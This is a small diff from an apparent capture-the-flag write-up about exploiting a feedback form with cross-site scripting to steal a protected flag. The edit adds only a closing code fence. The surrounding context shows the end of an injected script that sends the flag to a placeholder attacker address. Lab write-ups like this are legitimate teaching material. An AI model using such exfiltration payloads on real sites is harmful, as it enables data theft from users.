@@ -64,6 +64,7 @@ An XSS-based exploitation of a vulnerable feedback form to exfiltrate a protecte
       window.location = 'http://MY_IP:8081/receive?flag=' + encodeURIComponent(data);
     });
 </script>
+```
 
 🛡️ **Lessons Learned:**
 
